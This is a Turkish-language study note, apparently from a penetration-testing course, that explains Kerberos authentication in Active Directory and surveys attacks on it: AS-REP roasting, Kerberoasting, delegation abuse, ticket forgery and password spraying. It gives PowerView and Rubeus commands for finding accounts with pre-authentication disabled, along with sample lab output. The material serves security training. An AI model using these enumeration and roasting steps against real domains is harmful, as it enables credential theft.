---
{"dg-publish":true,"permalink":"/active-directory-expert/kerberos-attacks/"}
---

## Kerberos Overview

[Kerberos](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-kerberos), kullanıcıların ağ üzerinde **authenticate** olmasına ve bir kez **authenticate** olduktan sonra servislere erişmesine olanak tanıyan bir protokoldür. Kerberos varsayılan olarak port 88’i kullanır ve Windows 2000’den beri **domain** hesapları için varsayılan **authentication** protokolü olmuştur. Bir kullanıcı bilgisayarına giriş yaptığında, Kerberos onu **authenticate** etmek için kullanılır. Kullanıcı ağ üzerindeki bir servise erişmek istediğinde de Kerberos devreye girer. Kerberos sayesinde, bir kullanıcının sürekli olarak şifresini girmesine gerek kalmaz ve sunucunun her kullanıcının şifresini bilmesine gerek olmaz. Bu, **centralized authentication** örneğidir.

Kerberos, **stateless authentication** sağlayan ve **ticket** tabanlı bir protokoldür. Kullanıcının kimlik bilgilerini, erişmeye çalıştığı kaynaklardan etkili bir şekilde ayırarak şifresinin ağ üzerinden iletilmesini önler. Bu, bir [**Zero-knowledge proof**](https://en.wikipedia.org/wiki/Zero-knowledge_proof) protokolüdür. [Kerberos **Key Distribution Center (KDC)**](https://docs.microsoft.com/en-us/windows/win32/secauthn/key-distribution-center) önceki işlemleri kaydetmez; bunun yerine, **Kerberos Ticket Granting Service (TGS)** geçerli bir **Ticket Granting Ticket (TGT)** üzerine çalışır. Eğer bir kullanıcının geçerli bir **TGT**'si varsa, kimliğini kanıtlamış olduğu varsayılır.

"**Zero-knowledge proof**, bir tarafın (kanıtlayan) belirli bir bilgiyi karşı tarafa (doğrulayan) ifşa etmeden bildiğini kanıtlamasına olanak tanıyan bir kriptografik yöntemdir. Bu sayede doğrulayıcı, bilginin doğru olduğuna emin olur ancak bilginin kendisini öğrenmez."


### Basic Understanding

Çok üst düzeyde bakıldığında, bir kullanıcı ağdaki mevcut kaynaklarla etkileşime geçmek istediğinde aşağıdaki işlemler gerçekleşir:

- Öncelikle, merkezi bir sunucudan bir **"identity card"** talep eder.
- Kullanıcı, kim olduğunu kanıtlamak zorundadır ve bunun karşılığında **"identity card"**, yani [**Ticket Granting Ticket (TGT)**](https://docs.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets) alır.
- Kullanıcı bir servise erişmek istediğinde bu **TGT**'yi sunar. Bu nedenle, her servis erişim isteğinde bu kimliği gösterir ve eğer geçerliyse, merkezi sunucu, istenen kaynağa sunulacak geçici bir **ticket** sağlar.
- Bu geçici **ticket**, kullanıcının adı, grup üyelikleri vb. gibi tüm bilgilerini içerir.
- Kaynak, bu **ticket**'i alır ve eğer kullanıcı yetkiliyse, servislerine erişim izni verir.

Bu süreç iki aşamada gerçekleşir. İlk olarak, kullanıcının **TGT**'sini belirlemek için bir **ticket** talebi yapılır, ardından **Ticket Granting Service (TGS) ticket** veya **Service Ticket (ST)** kullanılarak servislere erişim isteğinde bulunulur.

Not: **Ticket Granting Service (TGS)**, **Key Distribution Center (KDC)**'nin bir bileşenidir ve servis **ticket**'larını dağıtmaktan sorumludur.

Not: Bu konu boyunca **TGS ticket** terimini kullandığımızda, aslında **Service Ticket (ST)**'den bahsediyormuşuz gibi düşünebilirsiniz.


### Kerberos Avantajları

Kerberos saldırıları ve **Golden Ticket attack** gibi tehditler hakkında konuşulduğunda, Kerberos'un zayıf bir **authentication** protokolü olduğu düşünülebilir. Ancak, Kerberos'tan önce **authentication**, `SMB / NTLM` üzerinden gerçekleşiyordu ve kullanıcının **hash** değeri, **authenticate** olduktan sonra bellekte saklanıyordu. Hedef makine ele geçirilip **NTLM hash** çalındığında, saldırgan `Pass-The-Hash attack` ile kullanıcının yetkili olduğu her şeye erişebilirdi. Daha önce belirtildiği gibi, **Kerberos ticket**'ları kullanıcının şifresini içermez ve **ticket**'ın erişim verdiği makineyi belirtir.

Bu nedenle, **WinRM** üzerinden makineler uzaktan erişildiğinde **Double Hop Problem** ortaya çıkar. **Non-Kerberos** bir protokol kullanılarak bir makineye uzaktan erişildiğinde, **NTLM password hash** oturuma bağlı olduğundan, aynı bağlantı kullanılarak yeniden **authenticate** olmadan başka makinelere erişmek mümkündür. Ancak, **Kerberos authentication** ile her erişilmek istenen makine için kimlik bilgileri özel olmalıdır, çünkü herhangi bir şifre bulunmaz. Bu konu hakkında daha fazla bilgi için **Active Directory Enumeration & Attacks** modülündeki **Kerberos "Double Hop" Problem** bölümüne bakabilirsiniz.

Bu nedenle, **`WinRM`** üzerinden makineler **remote** erişildiğinde [**Double Hop Problem**](https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f?gi=f925425e7a42) ortaya çıkar. **Non-Kerberos** bir protokol kullanılarak bir makineye **remote** erişildiğinde, **NTLM password hash** oturuma bağlı olduğundan, aynı bağlantı kullanılarak yeniden **authenticate** olmadan başka makinelere erişmek mümkündür. Ancak, **Kerberos authentication** ile her erişilmek istenen makine için kimlik bilgileri özel olmalıdır, çünkü herhangi bir şifre bulunmaz. 

Diyelim ki, aktif oturumlara sahip bir makine **Kerberos** ile **authenticate** edilmiştir. Bu durumda, **`Pass-The-Ticket attack`** gerçekleştirmek mümkündür. Ancak, **`Pass-The-Hash`**'ten farklı olarak, saldırgan sadece hedef kullanıcının **authenticate** olduğu kaynaklara erişimle sınırlıdır. Ayrıca, bu **ticket**'ların bir ömrü vardır, yani saldırganın kaynağa erişmek ve süreklilik sağlamak için sınırlı bir zaman penceresi vardır.

Aşağıdaki bölüm, **Kerberos authentication** sürecini ayrıntılı olarak açıklar, **ticket**'ların nasıl korunduğu ve içerdiği bilgiler hakkında bilgi verir. Bu süreci anlamak, **Kerberos** ile ilgili saldırılara geçmeden önce çok önemlidir. **Kerberos**'un bir **Active Directory** ortamında **lateral movement**, **privilege escalation** ve **persistence** sağlama için kötüye kullanılabileceği birçok yol vardır. Bu tekniklerin çoğuyla, **penetration test** ve **red team** değerlendirmelerimiz sırasında karşılaşacağız. **Security practitioners** olarak, **Kerberos**'un nasıl çalıştığını ve nasıl faydamıza kötüye kullanılabileceğini derinlemesine anlamalıyız. Ayrıca, **Kerberos** saldırılarının nasıl çalıştığını ve müşterilerin bunlardan nasıl korunabileceklerini, ayrıca **Kerberos abuse**'u tespit etmek için doğru **monitoring**'i nasıl kuracaklarını açıklamak da çok önemlidir.


### Kerberos Authentication Process

**Kerberos context**'inde, bir kullanıcı bir servise erişmek istediğinde üç varlık vardır: `user`, `servis` ve **`authentication server`** olarak da bilinen **Key Distribution Center (KDC)**.

**KDC**, tüm hesapların kimlik bilgilerini bilen varlıktır.

![Pasted image 20250215171009.png](/img/user/resimler/Pasted%20image%2020250215171009.png)

**Kerberos protocol**'ünün nasıl çalıştığını tam olarak anlamak ve ne için kullanıldığını görmek üzere detaylara ineceğiz.


### Why Kerberos?

Kendimize sorabileceğimiz ilk soru, bu protokol ne için kullanılır?

Bir yandan, **authentication**'ı merkezi hale getirerek, tüm servislerin her kullanıcının kimlik bilgilerini bilmesini engellemeye yarar. Bu, kullanıcıların düzenli olarak güncellenmesi gereken bir contex'de son derece pratik bir çözümdür; örneğin, şifre değişikliği, yeni bir kullanıcının eklenmesi veya bir kullanıcının devre dışı bırakılması ya da silinmesi gibi durumlar. Eğer tüm servislerin tüm kullanıcıların durumunu bilmesi gerekseydi, bu büyük bir karmaşıklık yaratırdı. Bunun yerine, yalnızca bir varlık, **KDC**, mevcut kullanıcıların güncel bir listesini tutmalıdır.

Diğer yandan, bu protokol, kullanıcıların **password** göndermeden servislere **authenticate** olmalarını sağlar. Bu, **man-in-the-middle** (diğer adıyla **on-path**) saldırılarına karşı mükemmel bir güvenlik önlemidir.


## High-level Genel Bakış 

### Tickets

Her iki ihtiyacı karşılamak için **Kerberos**, private key'ler ve bir **ticket** mekanizması kullanır. private key'ler, pratikte **Active Directory** ortamında, farklı hesapların şifreleri (ya da en azından bu şifrelerin **hash**) olarak kullanılır.

Yüksek seviyede bir perspektiften, bir kullanıcının bir servise nasıl erişebileceği şu şekildedir:

1. İlk olarak, kullanıcı, kim olduğunu kanıtlamak için **key server**'dan (yani **KDC**) ilk **ticket**'ı talep eder. Bu, **client**'ın **KDC**'ye **`authenticate`** olduğu andır. Bu **ticket**, **TGT** (Ticket Granting Ticket), kullanıcının kimlik kartıdır. Kullanıcı hakkında, isim, hesap oluşturulma tarihi, güvenlik bilgileri, kullanıcının ait olduğu gruplar gibi tüm bilgileri içerir. Bu kimlik kartı, yani **TGT**, varsayılan olarak birkaç saat ile sınırlıdır. Bu **ticket**, **KDC**'ye yapılan tüm diğer isteklerde sunulur.
    
2. **TGT** alındıktan sonra, kullanıcı, her seferinde bir servise erişmesi gerektiğinde bunu **KDC**'ye sunar. **KDC**, sunulan **TGT**'nin geçerliliğini ve kullanıcının bunu sahte olarak oluşturmadığını doğrular ve eğer doğruysa, kullanıcıya bir **Ticket Granting Service (TGS)** **ticket**'ı ya da **Service Ticket (ST)** verir. Kullanıcının **TGT**'deki bilgileri, **TGS** **ticket**'ında yer alır.
    
3. Artık kullanıcı, belirli bir servis için bir **TGS ticket**'ına sahip olduğunda, bu **TGS ticket**'ını servise sunar. Servis, bu **ticket**'ın geçerliliğini kontrol eder ve her şey yolundaysa, kullanıcının bilgilerini okuyarak, kullanıcının talep edilen servisi kullanma yetkisi olup olmadığını belirler. Dolayısıyla, `service, kullanıcının erişim haklarını kontrol eder`.

![Pasted image 20250215171650.png](/img/user/resimler/Pasted%20image%2020250215171650.png)


### Ticket Protection

Bu diyagram sayesinde, farklı değişimlerin nasıl gerçekleştiğini iyi bir şekilde anlıyoruz. Ancak, yukarıda açıklandığı gibi, **TGT** ve **TGS ticket**'ı, kullanıcıya ait tüm bilgileri içerir. **Service**, bu bilgiyi kullanarak kullanıcının erişim haklarını doğrular.

KDC tarafından sağlanan bu bilgilerin korunması gerekir. Kullanıcı, bu bilgiyi sahte olarak oluşturamamalıdır. İşte burada **encryption keys** devreye girer.

Her hesabın bir şifresi veya gizlisi vardır, bu da bir **encryption** ve **decryption key** olarak işlev görür. **KDC**, tüm kullanıcıların **keys**'ini bilir. **Tickets**'ları korumak için bu **keys**'ler şu şekilde kullanılır:

1. **KDC**'nin kullanıcıya gönderdiği **`TGT`**, sadece `**KDC**'nin bildiği private key` ile şifrelenir. Böylece kullanıcı, kendi hakkında olan bilgileri okuyamaz veya değiştiremez. **KDC** kendisi bu bilgiyi korur.
    
2. **KDC**'nin kullanıcıya gönderdiği **`TGS ticket`**, `service'in private key'`iyle şifrelenir. Aynı şekilde, kullanıcı **service key**'ini bilmediği için, **`TGS ticket`**'ındaki bilgileri değiştiremez. Diğer taraftan, bu **TGS ticket**'ını servise gönderdiğinde, servis, **ticket**'ın içeriğini şifre çözerek kullanıcının bilgilerini okuyabilir.

![Pasted image 20250215172532.png](/img/user/resimler/Pasted%20image%2020250215172532.png)


### Teknik Detaylar

Şimdi, kimlik doğrulama sürecinin nasıl bir araya geldiğini ve karşılaştığı çeşitli saldırılara karşı kullanılan koruma mekanizmalarını anlamak için detaylara ineceğiz. Bir servise erişimin üç aşamada gerçekleştirildiğini gördük. Bu aşamalar şu şekilde adlandırılır:

1. **TGT** isteği: **Authentication Service (AS)**
2. **TGS** isteği: **Ticket-Granting Service (TGS)**
3. **Service** isteği: **Application Request (AP)**

**Client** her aşamada bir istek gönderir ve sunucu yanıt verir. Bu üç değişimin nasıl çalıştığını, **tickets**'ların nasıl korunduğunu ve hangi **key** ile korunduğunu açıklayacağız.



### Authentication Service (AS)

#### Request (AS-REQ)

İlk olarak, kullanıcı bir **TGT** (ya da kimlik kartı) isteği yapar. Bu isteğe **`AS-REQ`** denir. Ancak **TGT** almak için, kimliklerini kanıtlamaları gerekmektedir. Bu istek, **KDC**'ye yapılır (bu, **Active Directory** ortamında **Domain Controller**'dır). **KDC**, tüm kullanıcı anahtarlarını tutar.

Kimliklerini kanıtlamak için kullanıcı, bir **`authenticator`** gönderir. Bu, kullanıcının kendi **private key**'iyle şifreleyeceği mevcut **time stamp**'tir. Kullanıcı adı da açık metin olarak gönderilir, böylece **KDC** kiminle işlem yapıldığını anlayabilir.

![Pasted image 20250215173404.png](/img/user/resimler/Pasted%20image%2020250215173404.png)

Bu isteği aldıktan sonra, **KDC** kullanıcı adını alacak, ilişkili anahtarı dizininde arayacak ve **authenticator**'ı şifre çözüp çözmediğini kontrol edecektir. Eğer başarılı olursa, bu, kullanıcının kendi **private key**'ini veritabanında kayıtlı olanla aynı şekilde kullandığı anlamına gelir ve kimlik doğrulaması yapılmış olur. Aksi takdirde, kimlik doğrulaması başarısız olur.

Bu adım,  `pre-authentication` (**önceden kimlik doğrulama**) olarak adlandırılır, zorunlu değildir ancak tüm hesaplar `varsayılan olarak` bunu yapmak zorundadır. Ancak, bir **administrator**'ın önceden kimlik doğrulamayı devre dışı bırakabileceğini belirtmek gerekir. Bu durumda, **client** artık bir **authenticator** göndermek zorunda değildir. **KDC** her durumda **TGT**'yi gönderecektir. Bunu başka bir bölümde ele alacağız.


### Response (AS-REP)

**KDC**, dolayısıyla **client**'ın **TGT** talebini almıştır. Eğer **KDC** **authenticator**'ı başarıyla çözebiliyorsa (veya eğer **client** için önceden kimlik doğrulama devre dışı bırakılmışsa), kullanıcıya **AS-REP** adlı bir yanıt gönderir.

Kalan tüm değiş tokuşları korumak için, **KDC** kullanıcıya yanıt vermeden önce `geçici bir session key` oluşturur. **Client**, bu anahtarı sonraki değiş tokuşlar için kullanacaktır. **KDC**, tüm bilgileri kullanıcının anahtarı ile şifrelemekten kaçınır. Daha önce belirttiğimiz gibi, **Kerberos** stateless bir protokoldür, bu yüzden **KDC** bu **session key**'i herhangi bir yerde saklamaz.

**AS-REP** yanıtında bulacağımız iki öğe vardır:

1. İlk olarak, kullanıcının talep ettiği **TGT**'yi bekliyoruz. Bu, tüm kullanıcının bilgilerini içerir ve **KDC**'nin anahtarı ile korunur, böylece kullanıcı bunu değiştiremez. Ayrıca, `oluşturulan` **`session key`**'in bir `kopyasını` da içerir.
    
2. İkinci olarak, **`session key`** vardır, ancak bu sefer `kullanıcının anahtarı` ile korunmuş bir şekilde.

![Pasted image 20250215173834.png](/img/user/resimler/Pasted%20image%2020250215173834.png)

Bu nedenle, bu **session key** yanıt içinde iki kez yer alır—bir versiyonu **KDC**'nin anahtarı ile korunur, diğeri ise kullanıcının anahtarı ile korunur.


### Ticket-Granting Service (TGS)

**Ticket-Granting Service (TGS)**, **Key Distribution Center (KDC)**'nin bir bileşenidir ve **service** **tickets**'lerini vermekten sorumludur.

Genellikle, **Active Directory** alanındaki bir **domain controller** üzerinde barındırılır. Bir **client** veya bilgisayar bir **service ticket** talep ettiğinde, istek **KDC**'nin **TGS** bileşenine gönderilir. **TGS**, kullanıcının veya bilgisayarın kimliğini doğrular ve istenilen kaynağa erişim iznini kontrol eder. Ardından, kaynağa erişim sağlamak için kullanılabilecek bir **service ticket** verir.


### Request (TGS-REQ)

**Client**, artık **TGT** talebine karşılık olarak **server**'dan bir yanıt almıştır. Bu yanıt, **KDC**'nin anahtarıyla korunmuş olan **TGT** ve **client**'ın/kullanıcının anahtarıyla korunmuş bir **session key** içerir. **Client**, bu bilgiyi çözebilir ve geçici **session key**'i çıkarabilir.

Kullanıcının bir sonraki adımı, bir **Service Ticket (ST)** veya **TGS ticket** talep etmek için **TGS-REQ** mesajı göndermektir. Bunu yapmak için **KDC**'ye üç şey iletecektir:

1. Erişmek istedikleri **service**'in adı (**SERVICE/HOST**, bu **Service Principal Name (SPN)** temsilidir)
2. Önceden aldıkları **TGT**, içinde kullanıcı bilgileri ve **session key**'in bir kopyası bulunan
3. Bu noktada **session key** kullanılarak şifrelenmiş bir **authenticator**

![Pasted image 20250215175149.png](/img/user/resimler/Pasted%20image%2020250215175149.png)


### Response (TGS-REP)

**KDC**, bu **TGS** talebini aldığında, **Kerberos** bir **stateless** protokol olduğu için, daha önce hangi bilgilerin değiş tokuş edildiği hakkında hiçbir fikri yoktur. Yine de, **TGS** talebinin geçerliliğini doğrulamalıdır. Bunu yapmak için **authenticator**'ın doğru **session key** ile şifrelendiğini doğrulamalıdır. Peki, **KDC** kullanılan **session key**'in doğru olduğunu nasıl bilecek? Hatırlayın ki, **TGT** içinde bir **session key** kopyası vardı. **KDC**, **TGT**'yi çözerek (bu sırada **TGT**'nin doğruluğunu kontrol ederek) **session key**'i çıkaracak. Bu **session key** ile **authenticator**'ın geçerliliğini doğrulayabilecektir.

Eğer bu işlemler doğru şekilde yapılırsa, **KDC** sadece talep edilen **service**'i okumalı ve **TGS-REP** mesajı ile kullanıcıya yanıt vermelidir. Daha önce **user** ile **KDC** arasındaki değiş tokuşlar için bir **session key** üretildiğini görmüştük. İşte burada da aynı şey geçerlidir. Kullanıcı ile **service** arasındaki gelecekteki değiş tokuşlar için yeni bir **session key** oluşturulur. Ve daha önce olduğu gibi, bu **session key** **KDC**'nin kullanıcıya gönderdiği yanıtta iki yerde bulunacaktır. İşte **KDC** tarafından gönderilen tüm öğeler:

Bir **service ticket** veya **TGS ticket** içeren üç öğe:

1. Talep edilen **service**'in adı (SPN'si)
2. **TGT**'de bulunan kullanıcının bilgileri kopyası. **Service**, bu bilgileri okuyarak kullanıcının bu **service**'i kullanmaya yetkili olup olmadığını belirleyecektir.
3. **Session key** kopyası

Tüm bu bilgiler, **user/KDC session key** ile şifrelenmiştir. Bu şifreli yanıt içinde, kullanıcının bilgileri ve **user/service session key** kopyası, **service key** ile şifrelenmiştir. Bu durumu daha iyi anlamak için bir diyagram yardımcı olacaktır.


## Application Request (AP)

### Request (AP-REQ)

Kullanıcı, şimdi bu yanıtı çözerek **user/service session key**'i ve **TGS ticket**'ı çıkarabilir, ancak **TGS ticket**'ı **service key** ile korunmaktadır. Kullanıcı bu **TGS ticket**'ı değiştiremez, bu yüzden haklarını değiştiremez, tıpkı **TGT**'de olduğu gibi.

Kullanıcı sadece bu **TGS ticket**'ı **service**'e iletecek ve tıpkı **TGS request**'te olduğu gibi bir **authenticator** ekleyecektir. Kullanıcı bu **authenticator**'ı neyle şifreleyecek? Tahmin ettiğiniz gibi, yeni çıkardığı **user/service session key** ile. Bu süreç, önceki **TGS request**'iyle oldukça benzerdir.

![Pasted image 20250215175652.png](/img/user/resimler/Pasted%20image%2020250215175652.png)



### Response (AP-REP)

Service nihayet **TGS ticket**'ını ve **user/service session key** ile şifrelenmiş bir **authenticator**'ı alır. Bu **TGS ticket**'ı **service key** ile korunmaktadır, böylece service bunu çözebilir. Unutmayın ki **user/service session key**'in bir kopyası **TGS ticket**'ına gömülü olduğu için, bu anahtarı çıkarabilir ve **authenticator**'ın geçerliliğini bu oturum anahtarıyla kontrol edebilir.

Her şey düzgün giderse, service nihayet kullanıcının bilgilerini okuyabilir, hangi gruplara ait olduğunu öğrenebilir ve erişim kurallarına göre kullanıcıya service'e erişim izni verebilir veya reddedebilir. Kimlik doğrulama başarılı olursa, service, **AP-REP** mesajıyla client'e yanıt verir ve **timestamp**'i çıkarılan oturum anahtarıyla şifreler. Client, bu mesajın service'ten geldiğini doğrulayabilir ve service isteklerini göndermeye başlayabilir.


Gördüğünüz gibi, tüm süreç paylaşılan anahtarlara dayanır ve üçlü bir iş birliğine dayanır. Bu, kullanıcıları ve servisleri **ticket** çalınması ve yeniden oynatılmasına karşı korur, çünkü saldırganlar geçerli **authenticator**'lar oluşturmak için anahtarları bilmeyeceklerdir. Ancak, yine de Kerberos'u saldırmak için kullanabileceğimiz bazı zayıflıklar ve yanlış yapılandırmalar vardır, bunları sonraki bölümlerde ele alacağız.  

Kerberos protokolü, işleyişi ve bileşenleri hakkında daha fazla açıklama yapmak isterseniz, [ATTL4S](https://twitter.com/DaniLJ94)'in [blogundaki](https://attl4s.github.io/) ve YouTube kanalındaki videolarını gözden geçirebilirsiniz: 

[You Do (Not) Understand Kerberos.](https://www.youtube.com/watch?v=4LDpb1R3Ghg&list=PLwb6et4T42wyb8dx-LQAA0PzLjw6ZlrXh)


## Kerberos Attacks Genel Bakış

Artık Kerberos'un temel ilkelerini ele aldığımıza göre, bu protokolün sunduğu belirli zayıflıkların veya fırsatların sömürülmesine ve analizine geçeceğiz.

Örneğin, **ticket** talepleri, **ticket** sahteciliği ve delegasyonla ilgili saldırıları vurgulayacağız. Ayrıca, bu protokolü kullanarak kullanıcı keşfi yapmanın ve hatta bazı hesapların parolalarını bulmak için **password spraying** yapmanın mümkün olduğunu göreceğiz.


### Ticket Request Attacks

Bir **ticket** talep etmenin iki yolu vardır:

- **TGT** talebi, yani **AS-REQ**, buna karşılık olarak **KDC** bir **AS-REP** yanıtı gönderir.
- **TGS** talebi, yani **TGS-REQ**, buna karşılık olarak **KDC** bir **TGS-REP** yanıtı gönderir.



### AS-REQ Roasting

Bir **TGT** talep ederken (**AS-REQ**), varsayılan olarak bir kullanıcının kimlik doğrulaması, kendi **secret** anahtarıyla şifrelenmiş bir **authenticator** ile yapılmalıdır. Ancak, eğer bir kullanıcının **preauthentication** özelliği devre dışı bırakılmışsa, o kullanıcı için kimlik doğrulama verisi talep edebiliriz ve **KDC** bir **AS-REP** mesajı döndürecektir. Bu mesajın bir kısmı (paylaşılan geçici oturum anahtarı) kullanıcının şifresiyle şifrelenmiş olduğundan, kullanıcının şifresini elde etmeye çalışmak için çevrimdışı bir **brute-force** saldırısı gerçekleştirmek mümkündür.


### Kerberoasting

Benzer şekilde, bir kullanıcı bir **TGT**'ye sahip olduğunda, mevcut herhangi bir **servis** için bir **Service Ticket** talep edebilir. **KDC** yanıtı (**TGS-REP**), **servis** hesabının **secret** anahtarıyla şifrelenmiş bilgileri içerir. Eğer **servis** hesabının şifresi zayıfsa, aynı çevrimdışı saldırıyı gerçekleştirerek o hesabın şifresini elde etmek mümkündür.


### **Kerberos Delegation Saldırıları**  

Kerberos Delegation, bir servisin bir kullanıcıyı taklit ederek başka bir kaynağa erişmesine izin verir. Kimlik doğrulama devredilir ve nihai kaynak, servise ilk kullanıcının haklarına sahipmiş gibi yanıt verir. Farklı türlerde delegasyon vardır ve her birinin, bir saldırganın (bazen keyfi) kullanıcıları taklit etmesine ve diğer servislere erişim sağlamak için kullanmasına olanak tanıyabilecek zayıflıkları bulunmaktadır. Kerberos'u kötüye kullanan şu saldırıları inceleyeceğiz: **`unconstrained delegation`**, **`constrained delegation`** ve **`resource-based constrained delegation`**.


### **Ticket Sahteciliği Saldırıları**  

Ticket'lar, keyfi ticket'ların sahteciliğini engellemek için secret anahtarlarla korunur (TGT, KDC anahtarıyla ve TGS ticket'ı servis hesabı anahtarıyla korunur). Bir saldırgan bu anahtarlardan birine sahip olursa, keyfi ticket'lar oluşturarak, keyfi haklarla servislere erişebilir. Aşağıdaki bölümler, bu iki saldırıyı açıklar: **Silver Ticket** (TGS sahteciliği) ve **Golden Ticket** (TGT sahteciliği).

### **Recon ve Password Spraying**  

Son olarak, Kerberos protokolü kullanılarak kullanıcılar üzerinde keşif yapılabilir ve şifreler test edilebilir. Belirli bir kullanıcı için bir TGT talep edersek, sunucu, kullanıcının veritabanında olup olmamasına bağlı olarak farklı bir şekilde yanıt verecektir. Aynı şekilde, authenticator'ı farklı şifrelerle şifreleyerek, seçilen kullanıcı için şifrenin geçerli olup olmadığını kontrol etmek mümkündür.


Kerberos kimlik doğrulama sürecinin ayrıntılarına ve buna karşı yapılabilecek saldırılara kısa bir genel bakış yaptıktan sonra, her bir saldırıyı tek tek inceleyelim ve bunları ekli laboratuvarlarda deneyelim.


### AS-REPRoasting

**AS-REPRoasting**, en temel Kerberos saldırısıdır ve **Pre-Authentication** mekanizmasını hedef alır. Bu durum bir organizasyonda nadir görülse de, herhangi bir ön kimlik doğrulama gerektirmeyen az sayıdaki Kerberos saldırılarından biridir. Saldırganın ihtiyacı olan tek bilgi, hedef aldığı kullanıcının **username** bilgisidir ve bu bilgi, diğer keşif teknikleriyle de bulunabilir.

Saldırgan **username** bilgisine sahip olduğunda, KDC'ye (**Key Distribution Center**) özel bir **AS_REQ** (**Authentication Service Request**) paketi göndererek ilgili kullanıcı gibi davranır. KDC ise bir **AS_REP** yanıtı döndürür. Bu yanıt, kullanıcının **password** bilgisinden türetilmiş bir anahtar ile şifrelenmiş bir veri içerir. Saldırgan, bu veriyi çevrimdışı olarak brute-force veya wordlist kullanarak kırarak kullanıcının **password** bilgisine ulaşabilir.


### Nasıl Çalışıyor?

**TGT** (**Ticket Granting Ticket**) talepleri, mevcut **timestamp** ve hesabın **password** bilgisi ile şifrelenir. **Domain Controller**, doğru **password** kullanıldığını doğrulamak için bu veriyi çözer. Eğer doğrulama başarılı olursa, **AS-REP** yanıtı ile kullanıcıya bir **TGT** verilir ve bu ticket, domaine yönelik sonraki kimlik doğrulama isteklerinde kullanılır.

Ayrıca, **TGT** ile birlikte bir **session key** de sağlanır ve bu anahtar kullanıcının **password** bilgisi ile şifrelenmiş şekilde iletilir.

![Pasted image 20250215192322.png](/img/user/resimler/Pasted%20image%2020250215192322.png)

Eğer bir hesapta **pre-authentication** devre dışı bırakılmışsa, bir saldırgan herhangi bir ön kimlik doğrulama gerektirmeden ilgili hesap için şifrelenmiş bir **TGT** elde edebilir. Bu **ticket**'lar, **Hashcat** veya **John the Ripper** gibi araçlar kullanılarak **offline password attack**'lara karşı savunmasızdır.

Özetle, "**Do not require Kerberos preauthentication**" ayarının etkin olduğu herhangi bir hesap için **Ticket Granting Ticket (TGT)** elde etmek mümkündür.

![Pasted image 20250215192409.png](/img/user/resimler/Pasted%20image%2020250215192409.png)

Birçok **vendor installation guide**, **service account**'ın bu şekilde yapılandırılmasını belirtir. **Authentication service reply (AS-REP)**, hesabın şifresiyle şifrelenir ve ağdaki herhangi biri bunu talep edebilir.

**`AS-REPRoasting`**, **`Kerberoasting`** ile benzerdir, ancak **`TGS-REP`** yerine **`AS-REP`**'e yönelik bir saldırıdır.

Bu ayar, **Impacket**, **PowerView** veya **PowerShell AD module** gibi **built-in tool**'lar kullanılarak **enumerate** edilebilir.

Saldırı, **[Impacket](https://github.com/SecureAuthCorp/impacket)**, **[Rubeus](https://github.com/GhostPack/Rubeus) toolkit** ve diğer araçlar kullanılarak hedef hesaba ait **ticket**'ı elde etmek için gerçekleştirilebilir. Daha önce belirtildiği gibi, bu ayarın etkin olduğu hesaplara rastlamak nispeten nadirdir. Ancak, zaman zaman değerlendirmelerimizde bu durumu görebiliriz. Yine de, **Service Principal Name (SPN)** içeren hesaplar daha yaygın olup, daha sonra bu modülde ele alacağımız **Kerberoasting** saldırısına daha sık maruz kalır.

Bu saldırıyı farklı şekillerde de kullanabiliriz. Örneğin, bir saldırganın bir hesap üzerinde **`GenericWrite`** veya **`GenericAll`** izinleri varsa, bu **attribute**'u etkinleştirip **AS_REP ticket** elde ederek şifreyi **offline cracking** ile kırabilir ve ardından bu ayarı tekrar devre dışı bırakabilir. Bu teknik, "**targeted AS-REPRoasting attack**" olarak da adlandırılır. Burada, ayarı etkinleştirerek **AS-REPRoasting** gerçekleştirebiliriz, ancak başarının sağlanması, kullanıcının nispeten zayıf bir şifreye sahip olmasına bağlıdır.

Şimdi, bu saldırıyı bir **Windows host** üzerinden nasıl gerçekleştireceğimizi bazı örneklerle inceleyelim.


### Enumeration

**[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)**, **[UserAccountControl](https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) (UAC)** özelliği **DONT_REQ_PREAUTH** olarak ayarlanmış kullanıcıları **enumerate** etmek için kullanılabilir.


#### PowerShell Enumeration of accounts with DONT_REQ_PREAUTH

```
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser -UACFilter DONT_REQ_PREAUTH
logoncount : 0
badpasswordtime : 12/31/1600 7:00:00 PM
distinguishedname : CN=Jenna Smith,OU=Server
Team,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
objectclass : {top, person, organizationalPerson, user}
displayname : Jenna Smith
userprincipalname : jenna.smith@inlanefreight
name : Jenna Smith
objectsid : S-1-5-21-2974783224-3764228556-2640795941-
1999
samaccountname : jenna.smith
admincount : 1
codepage : 0
samaccounttype : USER_OBJECT
accountexpires : NEVER
countrycode : 0
whenchanged : 8/3/2020 8:51:43 PM
instancetype : 4
usncreated : 19711
objectguid : ea3c930f-aa8e-4fdc-987c-4a9ee1a75409
sn : smith
lastlogoff : 12/31/1600 7:00:00 PM
objectcategory :
CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
dscorepropagationdata : {7/30/2020 6:28:24 PM, 7/30/2020 3:09:16
AM, 7/30/2020 3:09:16 AM, 7/28/2020 1:45:00
 AM...}
givenname : jenna
memberof : CN=Schema
Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
lastlogon : 12/31/1600 7:00:00 PM
badpwdcount : 0
cn : Jenna Smith
useraccountcontrol : PASSWD_NOTREQD, NORMAL_ACCOUNT,
DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
whencreated : 7/27/2020 7:35:57 PM
primarygroupid : 513
pwdlastset : 7/27/2020 3:35:57 PM
msds-supportedencryptiontypes : 0
usnchanged : 89508
```


**Rubeus** aracı, **[preauthscan](https://github.com/GhostPack/Rubeus#preauthscan)** aksiyonuyla **pre-authentication** gerektirmeyen hesapları bulmak için de kullanılabilir.

Not: **`Rubeus.exe asreproast /format:hashcat`** komutu, **`DONT_REQ_PREAUTH`** bayrağına sahip tüm hesapları **enumerate** etmek için kullanılabilir.


### Saldırının Gerçekleştirilmesi

